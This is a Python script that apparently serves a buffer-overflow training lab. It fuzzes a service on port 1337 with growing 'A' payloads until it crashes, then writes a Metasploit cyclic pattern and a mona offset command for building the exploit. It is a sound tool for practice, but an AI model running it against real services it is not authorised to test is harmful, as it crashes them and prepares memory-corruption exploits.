#!/usr/bin/env python3
import pwn
import socket, time, sys
from colorama import init as colorama_init
from colorama import Fore
colorama_init()

ip = "10.10.xx.xx" # CHANGE THIS TO MACHINE IP
port = 1337
timeout = 5
prefix = "OVERFLOW1 " # CHANGE THIS TO TASK 
string = prefix + "A" * 200
while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            s.recv(1024)
            print("[+] Sending with {} bytes".format(len(string) - len(prefix)))
            s.send(bytes(string, "latin-1"))
            s.recv(1024)
    except:
        print(f"{Fore.LIGHTRED_EX}[!] {Fore.LIGHTGREEN_EX}Fuzzing crashed at {Fore.LIGHTRED_EX}{len(string) - len(prefix)} bytes")
        x = pwn.cyclic_metasploit(len(string) - len(prefix)).decode()
        print(f"{Fore.LIGHTGREEN_EX}[+] Generate Pattern:{Fore.LIGHTYELLOW_EX}\n{x}")
        pattern = open('pattern.txt',"w")
        pattern.write(x)
        pattern.close()
        print(f"{Fore.LIGHTGREEN_EX}[+] Run on Mona: {Fore.LIGHTYELLOW_EX}!mona findmsp -distance {len(string) - len(prefix)}")
        

        sys.exit(0)

    string += 100 * "A"
    time.sleep(1)